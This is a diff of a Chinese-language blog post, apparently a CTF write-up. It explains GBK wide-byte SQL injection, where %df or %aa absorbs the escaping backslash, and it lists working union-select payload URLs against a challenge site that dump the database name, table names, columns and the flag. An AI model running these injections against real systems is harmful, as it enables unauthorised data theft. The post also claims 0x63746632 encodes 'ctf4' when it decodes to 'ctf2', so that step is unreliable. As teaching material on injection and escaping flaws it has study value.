@@ -73,7 +73,7 @@
 <p>mysql在使用了gbk编码的情况下，如果一个字节大于128(ascii码),则mysql会认为该字节和下一个字节是一个汉字</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES GBK"</span>); <span class="comment">#设置mysql编码为gbk</span></span><br></pre></td></tr></table></figure>
 <p>利用这一点，我们可以把addslashes函数添加的\弄成汉字,从而使用单引号</p>
-<p>举个例子:<br>%df\‘ url转码后为%df%5c%27,此时mysql会认为它是 運’</p>
+<p>举个例子:<br><code>%df\\&#39;</code> url转码后为<code>%df%5c%27</code>,此时mysql会认为它是 運’</p>
 <h2 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
 <p>id=1’时会返回</p>
 <blockquote>
@@ -86,13 +86,13 @@
 </blockquote>
 <p>使用宽字节注入,成功闭合了单引号，接下来是常规的注入操作</p>
 <h3 id="1-猜测列数"><a href="#1-猜测列数" class="headerlink" title="1.猜测列数"></a>1.猜测列数</h3><ul>
-<li>id=1%aa%27%20order by 2%23 没有报错      </li>
-<li>id=1%aa%27%20order by 3%23 报错<br>因此列数为2<h3 id="2-获取数据库名和表名"><a href="#2-获取数据库名和表名" class="headerlink" title="2.获取数据库名和表名"></a>2.获取数据库名和表名</h3></li>
-<li>id=-1%aa%27 union select 1,2%23 发现2会显示在页面上         </li>
-<li>id=-1%aa%27 union select 1,database()%23 获取数据库名为sae-chinalover           </li>
-<li>id=-1%aa%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 获取表名ctf,ctf2,ctf3,ctf4,news<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3></li>
-<li>id=-1%aa%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632%23 (0x63746632是ctf4的十六进制形式，因为这里我们没办法使用单引号，所以必须要用十六进制的形式)<h3 id="4-获取表中内容"><a href="#4-获取表中内容" class="headerlink" title="4.获取表中内容"></a>4.获取表中内容</h3></li>
-<li>id=-1%aa%27%20union%20select%201,group_concat(flag) from ctf4%23 获取flag列内容</li>
+<li><code>id=1%aa%27%20order by 2%23</code> 没有报错      </li>
+<li><code>id=1%aa%27%20order by 3%23</code> 报错<br>因此列数为2<h3 id="2-获取数据库名和表名"><a href="#2-获取数据库名和表名" class="headerlink" title="2.获取数据库名和表名"></a>2.获取数据库名和表名</h3></li>
+<li><code>id=-1%aa%27 union select 1,2%23</code> 发现2会显示在页面上         </li>
+<li><code>id=-1%aa%27 union select 1,database()%23</code> 获取数据库名为sae-chinalover           </li>
+<li><code>id=-1%aa%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 获取表名ctf,ctf2,ctf3,ctf4,news</code><h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3></li>
+<li><code>id=-1%aa%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632%23</code> (0x63746632是ctf4的十六进制形式，因为这里我们没办法使用单引号，所以必须要用十六进制的形式)<h3 id="4-获取表中内容"><a href="#4-获取表中内容" class="headerlink" title="4.获取表中内容"></a>4.获取表中内容</h3></li>
+<li><code>id=-1%aa%27%20union%20select%201,group_concat(flag) from ctf4%23</code> 获取flag列内容</li>
 </ul>
 
   </div>
